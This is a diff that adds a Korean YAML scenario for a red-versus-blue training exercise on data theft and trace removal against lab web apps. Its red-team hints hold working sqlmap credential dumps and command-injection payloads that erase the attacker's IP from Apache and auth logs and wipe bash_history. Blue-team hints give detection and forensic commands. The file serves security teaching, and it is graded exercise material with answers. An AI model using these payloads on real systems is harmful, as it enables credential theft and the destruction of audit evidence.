@@ -1,0 +1,134 @@
+id: "apt-phase3"
+title: "APT 3단계: 데이터 탈취 + 흔적 삭제"
+description: "APT 그룹이 내부 네트워크에 거점을 확보한 상황이다. 3단계에서 Red Team은 데이터베이스를 덤프하고 로그를 변조하여 흔적을 삭제해야 한다. Blue Team은 데이터 무결성을 검증하고 타임라인 포렌식으로 공격 전 과정을 재구성해야 한다."
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "SQLi를 통해 DVWA 데이터베이스의 전체 테이블 목록을 덤프하라."
+    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --tables 2>&1 | tail -30"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "tables"
+
+  - order: 2
+    instruction: "SQLi를 통해 사용자 크리덴셜을 덤프하라."
+    hint: "sqlmap -u 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch -T users --dump 2>&1 | tail -30"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "admin"
+
+  - order: 3
+    instruction: "JuiceShop의 API를 통해 모든 사용자 정보를 추출하라."
+    hint: "curl -s http://10.20.30.80:3000/api/Users | python3 -m json.tool 2>&1 | head -40"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "email"
+
+  - order: 4
+    instruction: "Command Injection으로 웹 서버의 Apache 접근 로그를 변조(자신의 IP 기록 삭제)를 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;sed+-i+\"/10.20.30.201/d\"+/var/log/apache2/access.log+2>&1;echo+log_cleared&Submit=Submit'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "log_cleared"
+
+  - order: 5
+    instruction: "Command Injection으로 bash_history를 삭제하여 명령 실행 흔적을 제거하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;cat+/dev/null+>+~/.bash_history+2>&1;echo+history_cleared&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "history_cleared"
+
+  - order: 6
+    instruction: "Command Injection으로 auth.log에서 자신의 IP 관련 기록 삭제를 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;sed+-i+\"/10.20.30.201/d\"+/var/log/auth.log+2>&1;echo+auth_cleared&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "auth_cleared"
+
+  - order: 7
+    instruction: "추출한 데이터를 압축하고 인코딩하여 유출 준비를 완료하라."
+    hint: "echo 'admin:password_hash:email@test.com' | gzip | base64 && echo 'Exfil package ready'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "Exfil package ready"
+
+blue_missions:
+  - order: 1
+    instruction: "Wazuh에서 파일 무결성 모니터링으로 로그 파일 변조를 탐지하라."
+    hint: "grep -i 'syscheck' /var/ossec/logs/alerts/alerts.json | grep -iE 'log\\|access\\|auth' | tail -20"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 2
+    instruction: "Apache 접근 로그의 무결성을 검증하라. 로그 파일의 크기와 최근 수정 시간을 확인하라."
+    hint: "stat /var/log/apache2/access.log && wc -l /var/log/apache2/access.log"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "Modify"
+
+  - order: 3
+    instruction: "suricata의 eve.json에서 공격자 IP의 전체 활동 타임라인을 재구성하라."
+    hint: "grep '10.20.30.201' /var/log/suricata/eve.json | python3 -c \"import sys,json; lines=[json.loads(l) for l in sys.stdin]; [print(d.get('timestamp','')[:19], d.get('event_type',''), d.get('http',{}).get('url','')[:50] if 'http' in d else '') for d in sorted(lines, key=lambda x: x.get('timestamp',''))]\" 2>/dev/null | tail -30"
+    points: 20
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "10.20.30"
+
+  - order: 4
+    instruction: "Wazuh의 알림 로그에서 전체 공격 타임라인(정찰-침투-유출)을 요약하라."
+    hint: "cat /var/ossec/logs/alerts/alerts.json | python3 -c \"import sys,json; [print(json.loads(l).get('timestamp','')[:19], json.loads(l).get('rule',{}).get('description','')[:60]) for l in sys.stdin if 'rule' in l]\" 2>/dev/null | tail -30"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 5
+    instruction: "웹 서버에서 최근 24시간 내 수정된 시스템 파일을 포렌식 관점에서 조사하라."
+    hint: "find /var/log /etc /var/www -type f -mmin -1440 -ls 2>/dev/null | sort -k9 | tail -30"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "/var/log"
+
+  - order: 6
+    instruction: "ModSecurity 감사 로그에서 SQLi 공격의 상세 내용을 분석하라."
+    hint: "grep -A 5 'sql\\|union\\|select' /var/log/apache2/modsec_audit.log | tail -30"
+    points: 10
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "sql"
+
+  - order: 7
+    instruction: "suricata 알림에서 데이터 유출 시도 패턴을 확인하고 관련 룰 ID를 식별하라."
+    hint: "grep -iE 'exfil\\|data\\|leak\\|transfer' /var/log/suricata/fast.log | tail -10; grep -oP '\\[\\d+:\\d+:\\d+\\]' /var/log/suricata/fast.log | sort -u | tail -10"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "["
